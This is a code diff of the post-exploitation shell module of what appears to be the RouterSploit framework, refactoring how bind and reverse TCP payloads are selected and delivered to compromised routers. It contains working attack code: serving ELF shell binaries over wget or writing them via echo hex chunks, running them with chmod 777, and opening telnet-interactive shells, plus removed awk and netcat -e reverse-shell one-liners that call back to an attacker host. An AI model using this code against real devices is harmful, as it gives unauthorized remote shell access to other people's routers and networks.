@@ -4,6 +4,9 @@ import SimpleHTTPServer
 import BaseHTTPServer
 import threading
 import time
+from os import listdir
+from os.path import isfile, join
+import importlib
 
 from printer import printer_queue
 from routersploit import validators
@@ -13,99 +16,102 @@ from routersploit.utils import (
     print_error,
     print_success,
     print_status,
+    print_table,
     random_text,
 )
 
-import routersploit.modules.payloads as payloads
-
-
-def bind_tcp(arch, rport):
-    print_status("Generating bind shell binary")
-
-    if arch == 'armle':
-        payload = payloads.armle_bind_tcp.Exploit()
-    elif arch == 'mipsle':
-        payload = payloads.mipsle_bind_tcp.Exploit()
-    elif arch == 'mipsbe':
-        payload = payloads.mipsbe_bind_tcp.Exploit()
-    else:
-        print_error("Platform not supported")
-        return None
-
-    payload.port = rport
-
-    data = payload.generate()
-    return payload.generate_elf(data)
-
-
-def reverse_tcp(arch, lhost, lport):
-    print_status("Generating reverse shell binary")
-
-    if arch == 'armle':
-        payload = payloads.armle_reverse_tcp.Exploit()
-    elif arch == 'mipsle':
-        payload = payloads.mipsle_reverse_tcp.Exploit()
-    elif arch == 'mipsbe':
-        payload = payloads.mipsbe_reverse_tcp.Exploit()
-    else:
-        print_error("Platform not supported")
-        return None
-
-    payload.target = lhost
-    payload.port = lport
-
-    data = payload.generate()
-    return payload.generate_elf(data)
-
 
 def shell(exploit, architecture="", method="", **params):
+    path = "routersploit/modules/payloads/{}/".format(architecture)
+    payload = None
+    options = []
+
     while 1:
         while not printer_queue.empty():
             pass
 
-        cmd = raw_input("cmd > ")
+        if payload is None:
+            cmd_str = "cmd > "
+        else:
+            cmd_str = "cmd (\033[92m{}\033[0m) > ".format(payload._Exploit__info__['name'])
+
+        cmd = raw_input(cmd_str)
 
         if cmd in ["quit", "exit"]:
             return
 
-        c = cmd.split()
-        if len(c) and (c[0] == "bind_tcp" or c[0] == "reverse_tcp"):
-            options = {}
-            if c[0] == "bind_tcp":
-                try:
-                    options['technique'] = "bind_tcp"
-                    options['rhost'] = validators.ipv4(exploit.target)
-                    options['rport'] = int(c[1])
-                    options['lhost'] = c[2]
-                    options['lport'] = int(c[3])
-                except:
-                    print_error("bind_tcp <rport> <lhost> <lport>")
+        elif cmd == "show payloads":
+            payloads = [f.split(".")[0] for f in listdir(path) if isfile(join(path, f)) and f.endswith(".py") and f != "__init__.py"]
 
-                payload = bind_tcp(architecture, options['rport'])
+            print_info("Available payloads:")
+            for payload_name in payloads:
+                print_info("- {}".format(payload_name))
 
-            elif c[0] == "reverse_tcp":
-                try:
-                    options['technique'] = "reverse_tcp"
-                    options['lhost'] = c[1]
-                    options['lport'] = int(c[2])
-                except:
-                    print_error("reverse_tcp <lhost> <lport>")
+        elif cmd.startswith("set payload "):
+            c = cmd.split(" ")
+            
+            payload_path = path.replace("/",".") + c[2]
+            payload = getattr(importlib.import_module(payload_path), 'Exploit')()
 
-                payload = reverse_tcp(architecture, options['lhost'], options['lport'])
+            options = []
+            for option in payload.exploit_attributes.keys():
+                if option not in ["output", "filepath"]:
+                    options.append([option, getattr(payload, option), payload.exploit_attributes[option]])
 
-            communication = Communication(exploit, payload, options)
+            if payload.handler == "bind_tcp":
+                options.append(["rhost", validators.ipv4(exploit.target), "Remote IP"])
 
-            if method == "wget":
-                communication.wget(binary=params['binary'], location=params['location'])
-            elif method == "echo":
-                communication.echo(binary=params['binary'], location=params['location'])
-            elif method == "awk":
-                communication.awk(binary=params['binary'])
-            elif method == "netcat":
-                communication.netcat(binary=params['binary'], shell=params['shell'])
+                if method == "wget":
+                    options.append(["lhost", "", ""])
+                    options.append(["lport", 4545, ""])
+        
+        elif payload is not None:
+            if cmd == "show options":
+                headers = ("Name", "Current settings", "Description")
+
+                print_info('\nPayload Options:')
+                print_table(headers, *options)
+                
+                print_info()
+
+                """
+                print_status("Payload options:")
+                for key in options.keys():
+                    print_info("- {}: {}".format(key, options[key]))
+                """
+
+            elif cmd.startswith("set "):
+                c = cmd.split(" ")
+                if len(c) != 3:
+                    print_error("set <option> <value>")
+                else:
+                    for option in options:
+                        if option[0] == c[1]:
+                            print_success("{'" + c[1] + "': '" + c[2] + "'}")
+                            option[1] = c[2]
+                            setattr(payload, c[1], c[2])
+        
+            elif cmd == "run":
+                exec_binary_str = ""
+                payload.generate()
+
+                if method == "wget":
+                    elf_binary = payload.generate_elf()
+                    communication = Communication(exploit, elf_binary, options, **params)
+                    communication.wget()
+                elif method == "echo":
+                    elf_binary = payload.generate_elf()
+                    communication = Communication(exploit, elf_binary, options, **params)
+                    communication.echo()
+                elif method == "generic":
+                    exec_binary_str = payload.payload
+
+                if payload.handler == "bind_tcp":
+                    communication.bind_tcp(exec_binary_str)
+                elif payload.handler == "reverse_tcp":
+                    communication.reverse_tcp(exec_binary_str)
         else:
-            print_info(exploit.execute(cmd))
-
+            exploit.execute(cmd)
 
 class HttpRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
     def do_GET(self):
@@ -129,11 +135,16 @@ class HttpServer(BaseHTTPServer.HTTPServer):
 
 
 class Communication(object):
-    def __init__(self, exploit, payload, options):
+    def __init__(self, exploit, payload, options, location, binary="", shell=""):
         self.exploit = exploit
         self.payload = payload
-        self.options = options
+        self.options = {option[0]: option[1] for option in options}
+
+        self.location = location
         self.binary_name = random_text(8)
+
+        self.binary = binary
+        self.shell = shell
 
     def http_server(self, lhost, lport):
         print_status("Setting up HTTP server")
@@ -142,7 +153,7 @@ class Communication(object):
         server.serve_forever(self.payload)
         server.server_close()
 
-    def wget(self, binary, location):
+    def wget(self):
         print_status("Using wget method")
 
         # run http server
@@ -151,41 +162,20 @@ class Communication(object):
 
         # wget binary
         print_status("Using wget to download binary")
-        cmd = "{} http://{}:{}/{} -O {}/{}".format(binary,
+        cmd = "{} http://{}:{}/{} -O {}/{}".format(self.binary,
                                                    self.options['lhost'],
                                                    self.options['lport'],
                                                    self.binary_name,
-                                                   location,
+                                                   self.location,
                                                    self.binary_name)
 
         self.exploit.execute(cmd)
 
-        # execute binary
-        if self.options['technique'] == "bind_tcp":
-            self.execute_binary(location, self.binary_name)
-
-            print_status("Connecting to {}:{}".format(self.options['rhost'], self.options['rport']))
-            time.sleep(2)
-
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((self.options['rhost'], self.options['rport']))
-
-            print_success("Enjoy your shell")
-            tn = telnetlib.Telnet()
-            tn.sock = sock
-            tn.interact()
-
-        elif self.options['technique'] == "reverse_tcp":
-            sock = self.listen(self.options['lhost'], self.options['lport'])
-            self.execute_binary(location, self.binary_name)
-
-            # waiting for shell
-            self.shell(sock)
-
-    def echo(self, binary, location):
+        
+    def echo(self):
         print_status("Using echo method")
 
-        path = "{}/{}".format(location, self.binary_name)
+        path = "{}/{}".format(self.location, self.binary_name)
 
         size = len(self.payload)
         num_parts = (size / 30) + 1
@@ -197,59 +187,14 @@ class Communication(object):
             print_status("Transferring {}/{} bytes".format(current, len(self.payload)))
 
             block = self.payload[current:current + 30].encode('hex')
-            block = "\\\\x" + "\\\\x".join(a + b for a, b in zip(block[::2], block[1::2]))
-            cmd = 'echo -ne "{}" >> {}'.format(block, path)
+            block = "\\x" + "\\x".join(a + b for a, b in zip(block[::2], block[1::2]))
+            cmd = 'echo -ne {} >> {}'.format(block, path)
             self.exploit.execute(cmd)
 
-        # execute binary
-        if self.options['technique'] == "bind_tcp":
-            self.execute_binary(location, self.binary_name)
-
-            print_status("Connecting to {}:{}".format(self.options['rhost'], self.options['rport']))
-            time.sleep(2)
-
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((self.options['rhost'], self.options['rport']))
-
-            print_success("Enjoy your shell")
-            tn = telnetlib.Telnet()
-            tn.sock = sock
-            tn.interact()
-
-        elif self.options['technique'] == "reverse_tcp":
-            sock = self.listen(self.options['lhost'], self.options['lport'])
-            self.execute_binary(location, self.binary_name)
-
-            # waiting for shell
-            self.shell(sock)
-
-    def awk(self, binary):
-        print_status("Using awk method")
-
-        # run reverse shell through awk
-        sock = self.listen(self.options['lhost'], self.options['lport'])
-        cmd = binary + " 'BEGIN{s=\"/inet/tcp/0/" + self.options['lhost'] + "/" + self.options['lport'] + "\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)};'"
-        self.exploit.execute(cmd)
-
-        # waiting for shell
-        self.shell(sock)
-
-    def netcat(self, binary, shell):
-        # run reverse shell through netcat
-        sock = self.listen(self.options['lhost'], self.options['lport'])
-        cmd = "{} {} {} -e {}".format(binary, self.options['lhost'], self.options['lport'], shell)
-
-        self.exploit.execute(cmd)
-
-        # waiting for shell
-        self.shell(sock)
-
-    def execute_binary(self, location, binary_name):
+    def build_exec_binary_str(self, location, binary_name):
         path = "{}/{}".format(location, binary_name)
-        cmd = "chmod 777 {}; {}; rm {}".format(path, path, path)
-
-        thread = threading.Thread(target=self.exploit.execute, args=(cmd,))
-        thread.start()
+        exec_binary_str = "chmod 777 {}; {}; rm {}".format(path, path, path)
+        return exec_binary_str
 
     def listen(self, lhost, lport):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -258,7 +203,16 @@ class Communication(object):
         sock.listen(5)
         return sock
 
-    def shell(self, sock):
+    def reverse_tcp(self, exec_binary_str=""):
+        sock = self.listen(self.options['lhost'], self.options['lport'])
+
+        if not exec_binary_str:
+            exec_binary_str = self.build_exec_binary_str(self.location, self.binary_name)
+
+        thread = threading.Thread(target=self.exploit.execute, args=(exec_binary_str,))
+        thread.start()
+
+        # waiting for shell
         print_status("Waiting for reverse shell...")
         client, addr = sock.accept()
         sock.close()
@@ -268,3 +222,22 @@ class Communication(object):
         t = telnetlib.Telnet()
         t.sock = client
         t.interact()
+
+    def bind_tcp(self, exec_binary_str=""):
+        if not exec_binary_str:
+            exec_binary_str = self.build_exec_binary_str(self.location, self.binary_name)
+
+        thread = threading.Thread(target=self.exploit.execute, args=(exec_binary_str,))
+        thread.start()
+
+        # connecting to shell
+        print_status("Connecting to {}:{}".format(self.options['rhost'], self.options['rport']))
+        time.sleep(2)
+
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((self.options['rhost'], self.options['rport']))
+
+        print_success("Enjoy your shell")
+        tn = telnetlib.Telnet()
+        tn.sock = sock
+        tn.interact()
